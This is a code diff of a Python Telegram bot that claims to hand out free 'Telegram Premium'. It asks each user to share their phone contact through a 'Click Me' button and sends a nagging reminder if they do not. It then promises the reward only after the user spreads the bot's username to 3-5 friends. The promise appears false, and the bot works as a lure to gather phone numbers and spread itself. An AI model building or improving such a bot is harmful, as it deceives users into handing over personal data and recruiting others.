@@ -1,7 +1,7 @@
-# Its Maked by:- @Hindu_papa 
+# Its Maked by:- @Hindu_papa
 
 import asyncio
-from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
+from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telegram.error import Forbidden, NetworkError
 import os
@@ -43,82 +43,95 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     contact_shared[user_id] = False
 
-    welcome_message = f"Welcome to {user_name} our VIP 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙥𝙧𝙞𝙢𝙞𝙪𝙢👑💎 BOT! ⚠️ please don't misused this BOT. ★𝟏st click 👇(𝘾𝙡𝙞𝙘𝙠 𝙈𝙚)👇 Button & allow permission."
+    welcome_text = f"Welcome to {user_name} our VIP 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙥𝙧𝙞𝙢𝙞𝙪𝙢👑💎 BOT! ♦ power by:- @Hindu_papa✓."
+    instruction_text = "★𝟏st click 👇(𝘾𝙡𝙞𝙘𝙠 𝙈𝙚)👇 Button & allow request."
 
-    keyboard = [
-        [KeyboardButton(text="💎Click Me💎", request_contact=True)],
-        [KeyboardButton(text="WHO I AM ?")]
+    # Inline keyboard for "WHO I AM ?" button
+    inline_keyboard_buttons = [
+        [InlineKeyboardButton(text="WHO I AM ?", url="https://t.me/MeNetwork108/14")]
     ]
-    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
+    inline_markup = InlineKeyboardMarkup(inline_keyboard_buttons)
+
+    # Reply keyboard for "Click Me" button
+    reply_keyboard_buttons = [
+        [KeyboardButton(text="💎Click Me💎", request_contact=True)]
+    ]
+    reply_markup_contact = ReplyKeyboardMarkup(reply_keyboard_buttons, resize_keyboard=True, one_time_keyboard=True)
 
     try:
-        await update.message.reply_text(text=welcome_message, reply_markup=reply_markup)
+        # Send welcome message with "WHO I AM ?" inline button
+        await update.message.reply_text(text=welcome_text, reply_markup=inline_markup)
+        
+        # Send instruction message for contact permission with the reply keyboard
+        await update.message.reply_text(text=instruction_text, reply_markup=reply_markup_contact)
+
     except Forbidden as e:
         if "bot was blocked by the user" in str(e).lower():
             print(f"🚫 Failed to send welcome message to {user_id} in {chat_id}: Bot blocked.")
         else:
             print(f"🚫 Forbidden sending welcome: {e}")
+    except Exception as e:
+        print(f"🚫 Error sending start messages to {user_id} in {chat_id}: {e}")
+
 
     async def check_contact_task_function():
         try:
-            await asyncio.sleep(180)
+            await asyncio.sleep(180) # 3 minutes
             if user_id in contact_shared and not contact_shared[user_id]:
+                # Ensure bot can send message to this chat_id
                 await context.bot.send_message(
                     chat_id=chat_id,
-                    text="★Request failed! Please give me permission. Tap ( 💎Click Me💎 ) button 🔘."
+                    text="★Request failed! Please give me permission. Tap ( 💎Click Me💎 ) button 🔘For request verification number!."
                 )
         except asyncio.CancelledError:
-            raise
+            # print(f"Contact check task cancelled for user {user_id}")
+            raise # Important to re-raise CancelledError
         except Forbidden as e:
-            print(f"🚫 Reminder error to {user_id}: {e}")
+            print(f"🚫 Reminder error (Forbidden) sending to chat {chat_id} for user {user_id}: {e}")
         except Exception as e:
-            print(f"Error in reminder task for {user_id}: {e}")
+            print(f"Error in reminder task for user {user_id} in chat {chat_id}: {e}")
         finally:
-            if 'contact_check_task' in context.user_data and context.user_data['contact_check_task'].done():
+            # Clean up task from context if it's finished
+            if 'contact_check_task' in context.user_data and \
+               (context.user_data['contact_check_task'].done() or \
+                context.user_data['contact_check_task'].cancelled()):
                 del context.user_data['contact_check_task']
 
+    # Store the task in user_data to manage it
     context.user_data['contact_check_task'] = asyncio.create_task(check_contact_task_function())
 
 async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    contact_shared[user_id] = True
+    contact_shared[user_id] = True # Mark that contact has been shared
 
+    # Cancel the reminder task as contact has been shared
     if 'contact_check_task' in context.user_data:
         try:
             context.user_data['contact_check_task'].cancel()
+            # print(f"Contact check task cancelled for user {user_id} after contact shared.")
         except Exception as e:
-            print(f"Error cancelling task: {e}")
+            print(f"Error cancelling task for user {user_id} after contact shared: {e}")
+        # No need to del here, finally block in task will handle it or it will be overwritten on next /start
 
     msg = "Nice👍 ★Now share this bot username ( @T_G_primium_108Bot ) 3-5 friends! Then i give you TG PRIMIUM👑💎 THX 🙏."
     try:
         await update.message.reply_text(msg)
     except Forbidden as e:
         print(f"🚫 Error sending contact reply to {user_id}: {e}")
-
-async def handle_who_i_am(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        await update.message.reply_text(
-            "Opening link...",
-            disable_web_page_preview=True,
-            reply_markup=None
-        )
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text="👉 [WHO I AM ?](https://t.me/MeNetwork108/14)",
-            parse_mode="Markdown"
-        )
     except Exception as e:
-        print(f"Error opening link: {e}")
+        print(f"🚫 Error sending contact reply to {user_id}: {e}")
+
 
 def main():
     application = Application.builder().token(TOKEN).build()
     application.add_error_handler(error_handler)
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.CONTACT, handle_contact))
-    application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^WHO I AM ?$"), handle_who_i_am))
+    # The MessageHandler for "WHO I AM ?" text is removed as it's now an inline URL button.
 
     print("Bot started...")
     application.run_polling()
 
 if __name__ == "__main__":
     main()
+        
